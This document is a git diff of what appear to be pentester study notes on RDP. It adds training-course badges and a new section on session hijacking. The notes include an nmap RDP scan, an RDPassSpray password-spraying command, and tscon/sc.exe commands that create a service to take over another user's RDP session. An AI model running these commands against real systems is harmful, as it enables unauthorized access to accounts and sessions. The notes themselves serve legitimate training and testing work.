@@ -37,11 +37,12 @@ There is [Remmina](https://github.com/FreeRDP/Remmina) (1.9k ⭐, `apt install r
 
 ## RDP Pentester Notes ☠️
 
-[![passwordattacks](../../../cybersecurity/_badges/thmp/passwordattacks.svg)](https://tryhackme.com/room/passwordattacks)
-
 <div class="row row-cols-lg-2"><div>
 
 #### Enumeration
+
+[![attacking_common_services](../../../cybersecurity/_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
+[![passwordattacks](../../../cybersecurity/_badges/thmp/passwordattacks.svg)](https://tryhackme.com/room/passwordattacks)
 
 * Using [nmap](/cybersecurity/red-team/tools/scanners/ports/nmap.md) to run scripts
 
@@ -51,6 +52,10 @@ $ sudo nmap -sV -sC -p 3389 --script rdp* 10.129.201.248
 ```
 
 #### Foothold
+
+[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+[![attacking_common_services](../../../cybersecurity/_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
+[![passwordattacks](../../../cybersecurity/_badges/thmp/passwordattacks.svg)](https://tryhackme.com/room/passwordattacks)
 
 * The password may be weak and vulnerable to [brute force](/cybersecurity/red-team/s2.discovery/techniques/network/auth.md).
 
@@ -69,9 +74,26 @@ $ python3 RDPassSpray.py [...] -T rdp_servers.lst
 ```
 </div><div>
 
+#### Exploitation
+
+[![attacking_common_services](../../../cybersecurity/_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
+
+* **RDP Session Hijacking**: connect to another user session. On Windows, as admin, we can use [tscon](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon).
+
+```ps
+PS> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
+```
+
+On Windows Server prior to 2019 as a local administrator, we can use:
+
+```ps
+PS> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+PS> net start sessionhijack
+```
+
 #### Well-known CVEs
 
-* [BlueKeep Vulnerability](https://en.wikipedia.org/wiki/BlueKeep) (2019)
+* [BlueKeep Vulnerability](https://en.wikipedia.org/wiki/BlueKeep) <small>(2019, RCE, unstable/BSoD)</small>
 
 #### Additional Tools
 
